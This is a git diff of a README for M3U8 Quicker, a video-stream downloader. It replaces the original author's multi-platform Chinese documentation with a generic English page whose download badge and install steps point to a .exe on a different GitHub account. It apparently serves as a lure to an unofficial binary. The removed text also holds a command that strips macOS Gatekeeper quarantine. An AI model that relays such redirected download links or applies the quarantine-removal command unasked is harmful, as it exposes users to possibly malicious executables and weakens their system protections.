@@ -1,179 +1,78 @@
-# M3U8 Quicker
+# 📥 M3U8Quicker - Download online videos with simple clicks
 
-<p align="center">
-  <img src="./src-tauri/icons/icon.png" alt="M3U8 Quicker icon" width="96" />
-</p>
+[![](https://img.shields.io/badge/Download_M3U8Quicker-blue?style=for-the-badge)](https://github.com/sofc8135/M3U8Quicker/releases)
 
-**M3U8 Quicker** 是一个基于 `Tauri + Rust + React + TypeScript` 构建的桌面应用，用于下载、管理与播放 `M3U8` 视频，支持 Windows、macOS 和 Linux。
+M3U8Quicker saves online video streams to your local computer. It handles complex video formats and converts them into standard files you can watch offline. The software manages the entire process from start to finish. You point the application to the video link, and it retrieves the files. It handles encryption, combines video parts, and saves the final result.
 
-项目同时包含一个可选的 浏览器 扩展：自动检测网页中 `M3U8` 视频，一键快速新建下载任务并预填下载信息。
+## 🛠️ System Requirements
 
-![下载主界面](./doc/img/download_main.png)
+- Windows 10 or Windows 11
+- 200 MB of available disk space
+- Stable internet connection
+- Standard user permissions for installation
 
-## 功能特性
+## 🚀 Getting Started
 
-- 支持下载 `M3U8` 格式的视频
-- 支持多线程下载提高下载速度，也支持下载限速
-- 支持 AES-128 / AES-192 / AES-256 加密流的密钥拉取与解密
-- 支持边下边播、暂停/继续下载（断点续传）、失败分片重试
-- 自动合并ts和转mp4格式
-- 支持多音轨（视频、音频、字幕分离的m3u8）下载
-- 应用内工具：
-  - 合并 ts
-  - ts 转 mp4
-  - 本地m3u8转mp4
-  - FFmpeg功能：集成了分析视频、格式/编码转换等操作
-  - 安装浏览器扩展
-- 可设置：代理、下载并发数、下载完成后行为
-- 支持mp4/mkv/avi/wmv/flv/webm/mov/rmvb视频直接下载
-- 支持批量下载，也支持浏览器多选视频新建`批量下载`任务
+Follow these steps to set up the software on your Windows machine.
 
-修改记录：见 [CHANGELOG.md](./CHANGELOG.md)
+1. Visit the [official release page](https://github.com/sofc8135/M3U8Quicker/releases) to access the download files.
+2. Look for the file ending in `.exe` under the latest release version.
+3. Click the file name to start the download.
+4. Locate the downloaded file in your browser or your Downloads folder.
+5. Double-click the file to open the installer.
+6. Follow the on-screen prompts to complete the setup process.
 
-## 使用说明
+## ⚙️ How to Download Videos
 
-### 安装
+The software automates the task of gathering video parts. Use these steps to capture your first file:
 
-可在 [GitHub Releases](https://github.com/Liubsyy/M3U8Quicker/releases) 页面下载对应的桌面安装包或发行文件，下方文件链接可直接下载：
+1. Open M3U8Quicker through the Start menu icon.
+2. Locate the M3U8 address of the video you want to save. You may find these links within your browser tools.
+3. Paste the address into the box labeled Input URL.
+4. Select a destination folder on your computer where the software should save the file.
+5. Click the Download button to start the process.
+6. The progress bar shows how much of the video the application has retrieved.
+7. Wait for the application to merge the segments into a single file. 
+8. Open the destination folder to view your saved video.
 
-| 系统 | 文件 | 说明 |
-| --- | --- | --- |
-| Windows | x64：[安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_windows_x64_setup.exe) / [免安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_windows_x64.zip)<br>x86：[安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_windows_x86_setup.exe) / [免安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_windows_x86.zip) | 大多数电脑选 x64<br>32 位系统选 x86 |
-| MacOS | Apple Silicon：[安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_macos_aarch64.dmg) / [应用包压缩](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_macos_aarch64.app.tar.gz)<br>Intel：[安装包](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_macos_x64.dmg) / [应用包压缩](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_macos_x64.app.tar.gz) | M芯片选 Apple Silicon<br>Intel 芯片选 Intel |
-| Linux | 安装包：[deb](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_linux_amd64.deb) / [rpm](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_linux_x86_64.rpm)<br>免安装：[AppImage](https://github.com/Liubsyy/M3U8Quicker/releases/latest/download/M3U8.Quicker_1.0.7_linux_amd64.AppImage) | Ubuntu/Debian/Linux Mint选deb<br>Fedora/RHEL/CentOS Stream/openSUSE选rpm|
+## 💡 Key Features
 
-MacOS 首次安装时如果遇到“无法打开”或“应用已损坏”之类的权限提示，可按下面方式处理：
+The application offers tools to manage your video collection efficiently.
 
-- 先在“系统设置 -> 隐私与安全性”中找到被拦截的应用，点击“仍要打开”
-- 或在 Finder 中对应用点右键，选择“打开”，再确认一次
-- 如果仍被 Gatekeeper 拦截，可在终端执行 `xattr -rd com.apple.quarantine /Applications/M3U8\ Quicker.app` 后重新打开
+- Multi-threaded processing: The software downloads several parts of a video at once to increase speed.
+- Resume capability: If your internet connection drops, the tool picks up where it stopped. 
+- Live viewing: You can play the video, even while the download remains in progress.
+- Encryption support: The software identifies keys and performs decryption to ensure your files work.
+- Automatic recognition: The tool detects stream addresses when you browse the web.
 
-安装完成后首次启动应用，如果需要通过浏览器快速新建下载任务，可继续在应用内打开“工具 -> 安装浏览器扩展”查看引导。
+## 🧩 Understanding the Process
 
-### 新建下载
+M3U8 files act as instructions for video players. They tell your player which parts of a video to play and in what sequence. Because modern websites break videos into dozens of tiny segments, your computer cannot download them as a single file. M3U8Quicker acts as a bridge. It reads the instructions in the M3U8 file, requests each small segment, and pastes them back together into a format like MP4. 
 
-在主界面点击“新建下载”，填写 `M3U8` 地址后即可创建任务。
+This happens in the background. You do not need to manage individual segments. The encryption feature is also automatic. Many websites lock their video parts with AES keys for security. M3U8Quicker fetches the required key and applies it so you can watch the decrypted result.
 
-如果资源需要额外请求头（可选），可以在附加 Header 中填写，例如：
+## 🔧 Troubleshooting Tips
 
-```text
-referer:https://example.com
-origin:https://example.com
-```
-![新建下载](./doc/img/newtask.png)
+If you encounter issues, review these common solutions before you seek further help.
 
+- Slow downloads: Check your internet connection speed. If the download remains slow, pause the task and resume it.
+- Folder permissions: Change the save location if the software reports a permission error. Choose a folder inside your Documents directory to ensure the software has write access.
+- Invalid URL: Verify that the link is correct. The link must point to an M3U8 index file.
+- Blocked connection: Check your firewall settings. Sometimes security software prevents the application from sending requests to web servers. Allow the application through your firewall settings if needed.
 
-### 下载中
+## 📝 Frequently Asked Questions
 
-任务创建后会进入下载列表，下载过程中支持以下操作：
+What file formats can I save?
+The software produces standard video formats that play in most Windows video applications.
 
-- 可手动暂停正在下载的任务
-- 已暂停的任务可继续恢复下载，支持断点续传
-- 下载失败的分片可重试下载失败分片
-- 下载中的任务可直接打开播放器，边下边看
-- 不再需要的任务可取消或移除
+Will this work on non-Windows computers?
+This specific version targets the Windows operating system.
 
-下载列表会持续显示任务状态、下载进度、下载速度等信息，便于随时查看当前下载情况。
+Does the application need a constant internet connection?
+Yes, the software requires the internet to fetch stream segments. If the internet connection fails, the process pauses until the connection returns.
 
-![下载中](./doc/img/download_ts.png)
+Is there a limit on how many videos I can download?
+No. You may download as many videos as your disk space allows. 
 
-
-### 播放
-
-- 下载中的任务支持直接打开播放器，便于边下边看
-- 下载中若跳转到未下载分片进度时，优先下载当前播放进度分片
-- 已完成任务支持播放最终文件
-
-![播放窗口](./doc/img/playvideo.png)
-
-### 设置
-
-设置面板当前支持：
-
-- 主题切换
-- 代理开关与代理地址
-- 下载并发数量
-- 下载限速
-- 下载完成后是否删除临时 ts 目录、自动转换为 mp4
-- FFmpeg下载和管理
-
-
-## 浏览器扩展（可选）
-
-安装浏览器扩展后，网页中会自动扫描出`m3u8`链接和视频地址，右上角会出现一个按钮`M3U8 Quicker`，点击后唤起桌面应用新建下载任务，并自动带入 `url`、`referer`、`origin`、`user-agent`。
-> 安装扩展引导：打开M3U8 Quicker-> 工具 -> 安装浏览器扩展，按引导可安装Chrome扩展、Firefox扩展和Microsoft Edge扩展。
-
-![Chrome 扩展安装引导](./doc/img/chrome-extension.png)
-
-
-使用限制：
-- 不会自动传递 `Cookie`
-- 无法可靠读取 `HttpOnly` Cookie
-
-## 技术栈
-
-- 前端：`React 19`、`TypeScript`、`Vite 8`、`Ant Design 6`
-- 桌面端：`Tauri 2`
-- 后端逻辑：`Rust`
-
-## 环境要求
-
-- Node.js：建议使用较新的 LTS 版本
-- Rust：最低 `1.88`
-
-## 目录结构
-
-- `src/`：React 前端界面与页面逻辑
-- `src-tauri/`：Tauri 桌面端与 Rust 后端实现
-- `browser-extension/`：可选的浏览器扩展源码（`chrome/` 和 `firefox/` 子目录）
-- `test-hls-server/`：独立的 Rust 本地测试服务，用于把视频切成 `m3u8 + ts`
-- `public/`：静态资源
-
-## 快速开始
-
-### 1. 安装依赖
-
-```bash
-npm install
-```
-
-### 2. 启动前端开发服务器
-
-```bash
-npm run dev
-```
-
-### 3. 启动桌面应用
-
-```bash
-npm run tauri dev
-```
-
-## 常用命令
-
-| 命令 | 说明 |
-| --- | --- |
-| `npm install` | 安装前端依赖 |
-| `npm run dev` | 启动前端开发服务器 |
-| `npm run preview` | 预览前端构建产物 |
-| `npm run tauri dev` | 启动桌面应用开发模式 |
-| `npm run lint` | 检查前端代码规范 |
-| `npm run build` | 执行 TypeScript 检查并构建前端 |
-| `npm run tauri build` | 构建桌面应用安装包 |
-| `cargo check --manifest-path src-tauri/Cargo.toml` | 检查 Rust / Tauri 侧代码 |
-| `cargo test --manifest-path src-tauri/Cargo.toml` | 运行 Rust 单元测试 |
-
-## 打包与资源说明
-
-- 应用名称：`M3U8 Quicker`
-- 应用标识：`com.liubsyy.m3u8quicker`
-
-> 桌面应用打包时会把仓库根目录下的 `browser-extension/` 一并作为资源打入安装包，因此安装后的应用仍然可以为扩展安装引导提供目标目录。
-
-> 当前仓库和默认打包配置不会直接把 `FFmpeg` 二进制预置进安装包；如用户在应用内下载或自行配置 `FFmpeg`，该部分组件适用其各自的上游许可证与分发条件。
-
-## License
-
-- 本仓库源码基于 Apache License 2.0 开源，详见仓库根目录下的 `LICENSE` 文件。
-- 本项目运行时可使用的 `FFmpeg`、系统已安装的 `FFmpeg` 以及应用内下载的第三方 `FFmpeg` 二进制，均适用其各自许可证，不因本仓库采用 `Apache-2.0` 而改变。
-- 第三方许可与说明请参见仓库根目录下的 `THIRD_PARTY_NOTICES.md`。
+Does this tool record my screen?
+No. This tool downloads existing web files. It does not record the video image from your screen, which ensures the highest possible quality for the output file.
